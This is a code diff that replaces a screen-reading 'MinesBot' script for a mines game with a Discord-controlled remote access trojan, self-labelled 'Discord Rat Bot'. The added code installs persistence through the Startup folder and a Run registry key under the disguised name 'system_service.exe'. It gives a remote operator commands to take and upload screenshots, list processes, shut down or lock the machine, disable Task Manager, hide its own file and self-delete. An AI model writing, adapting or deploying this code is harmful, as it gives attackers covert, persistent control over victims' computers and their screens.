@@ -1,67 +1,178 @@
+import discord
+import os
+import sys
+import subprocess
+import winreg
+import win32api
+import win32con
+import win32gui
+import win32ui
+import psutil
 import pyautogui
-import cv2
-import numpy as np
-import time
+import shutil
+import tempfile
+from discord.ext import commands
+from PIL import ImageGrab
 
-# Define the game screen region (left, top, width, height)
-GAME_REGION = (100, 200, 600, 600)
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Load template images (place in same folder)
-TEMPLATE_UNOPENED = cv2.imread('unopened.png', 0)
-TEMPLATE_GEM = cv2.imread('gem.png', 0)
-TEMPLATE_BOMB = cv2.imread('bomb.png', 0)
+TOKEN = 'YOUR_BOT_TOKEN_HERE'
 
-TILE_SIZE = 50  # Adjust based on your game tile size
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user.name}')
+    await worm_behavior()
 
-def grab_screen():
-    screenshot = pyautogui.screenshot(region=GAME_REGION)
-    return cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2GRAY)
+async def worm_behavior():
+    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    exe_path = sys.executable
+    dest_path = os.path.join(startup_path, 'system_service.exe')
+    
+    if not os.path.exists(dest_path):
+        shutil.copy2(exe_path, dest_path)
+    
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, dest_path)
+        winreg.CloseKey(key)
+    except Exception as e:
+        print(f"Registry error: {e}")
 
-def match_tile(tile_img, template):
-    res = cv2.matchTemplate(tile_img, template, cv2.TM_CCOEFF_NORMED)
-    _, max_val, _, _ = cv2.minMaxLoc(res)
-    return max_val
+@bot.command()
+async def help(ctx):
+    commands_list = [
+        "!help - Show available commands",
+        "!info - Show system information",
+        "!screenshot - Take a screenshot",
+        "!worm - Establish worm persistence",
+        "!processes - List running processes",
+        "!shutdown - Shutdown the computer",
+        "!restart - Restart the computer",
+        "!logoff - Log off the current user",
+        "!lock - Lock the workstation",
+        "!delete - Self-destruct the bot",
+        "!website - Open a website",
+        "!message - Show a message box",
+        "!disable_taskmgr - Disable Task Manager",
+        "!enable_taskmgr - Enable Task Manager",
+        "!hide_file - Hide the bot file"
+    ]
+    await ctx.send("\n".join(commands_list))
 
-def analyze_board():
-    board_image = grab_screen()
-    rows = board_image.shape[0] // TILE_SIZE
-    cols = board_image.shape[1] // TILE_SIZE
+@bot.command()
+async def info(ctx):
+    info_msg = (
+        f"Discord Rat Bot - System Info:\n"
+        f"OS: Windows\n"
+        f"Architecture: {os.environ['PROCESSOR_ARCHITECTURE']}\n"
+        f"Bot Version: 1.0"
+    )
+    await ctx.send(info_msg)
 
-    board = []
+@bot.command()
+async def screenshot(ctx):
+    try:
+        screenshot = pyautogui.screenshot()
+        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
+            screenshot.save(temp_file.name)
+            await ctx.send(file=discord.File(temp_file.name))
+        os.unlink(temp_file.name)
+    except Exception as e:
+        await ctx.send(f"Error taking screenshot: {e}")
 
-    for r in range(rows):
-        row = ""
-        for c in range(cols):
-            x = c * TILE_SIZE
-            y = r * TILE_SIZE
-            tile = board_image[y:y+TILE_SIZE, x:x+TILE_SIZE]
+@bot.command()
+async def worm(ctx):
+    await worm_behavior()
+    await ctx.send("Worm persistence established.")
 
-            score_unopened = match_tile(tile, TEMPLATE_UNOPENED)
-            score_gem = match_tile(tile, TEMPLATE_GEM)
-            score_bomb = match_tile(tile, TEMPLATE_BOMB)
+@bot.command()
+async def processes(ctx):
+    process_list = "Running processes:\n"
+    for proc in psutil.process_iter(['name']):
+        process_list += f"{proc.info['name']}\n"
+    await ctx.send(process_list)
 
-            best_score = max(score_unopened, score_gem, score_bomb)
+@bot.command()
+async def shutdown(ctx):
+    await ctx.send("Shutting down system...")
+    os.system("shutdown /s /t 1")
 
-            if best_score == score_unopened:
-                row += "@"
-            elif best_score == score_gem:
-                row += "$"
-            elif best_score == score_bomb:
-                row += "!"
-            else:
-                row += "?"
+@bot.command()
+async def restart(ctx):
+    await ctx.send("Restarting system...")
+    os.system("shutdown /r /t 1")
 
-        board.append(row)
+@bot.command()
+async def logoff(ctx):
+    await ctx.send("Logging off user...")
+    os.system("shutdown /l")
 
-    print("\nDetected Game Board:")
-    for row in board:
-        print(" ".join(row))
+@bot.command()
+async def lock(ctx):
+    await ctx.send("Locking workstation...")
+    win32api.LockWorkStation()
 
-# Main loop
-print("Starting MinesBot... Press Ctrl+C to stop.")
-try:
-    while True:
-        analyze_board()
-        time.sleep(1.5)
-except KeyboardInterrupt:
-    print("Stopped.")
+@bot.command()
+async def delete(ctx):
+    await ctx.send("Self-destruction initiated. Goodbye!")
+    exe_path = sys.executable
+    
+    batch_cmd = f"""@echo off
+timeout /t 2 >nul
+del "{exe_path}"
+del "{exe_path}"
+del "%~f0"
+"""
+    
+    temp_dir = tempfile.gettempdir()
+    batch_path = os.path.join(temp_dir, 'clean.bat')
+    
+    with open(batch_path, 'w') as batch_file:
+        batch_file.write(batch_cmd)
+    
+    subprocess.Popen(batch_path, shell=True)
+    sys.exit(0)
+
+@bot.command()
+async def website(ctx):
+    await ctx.send("Opening website...")
+    subprocess.Popen('start https://www.example.com', shell=True)
+
+@bot.command()
+async def message(ctx):
+    await ctx.send("Showing message box...")
+    win32api.MessageBox(0, "You've been compromised!", "Warning", win32con.MB_ICONWARNING | win32con.MB_OK)
+
+@bot.command()
+async def disable_taskmgr(ctx):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        await ctx.send("Task Manager disabled.")
+    except Exception as e:
+        await ctx.send(f"Error disabling Task Manager: {e}")
+
+@bot.command()
+async def enable_taskmgr(ctx):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        await ctx.send("Task Manager enabled.")
+    except Exception as e:
+        await ctx.send(f"Error enabling Task Manager: {e}")
+
+@bot.command()
+async def hide_file(ctx):
+    exe_path = sys.executable
+    try:
+        win32api.SetFileAttributes(exe_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
+        await ctx.send("File hidden.")
+    except Exception as e:
+        await ctx.send(f"Error hiding file: {e}")
+
+if __name__ == "__main__":
+    bot.run(TOKEN)
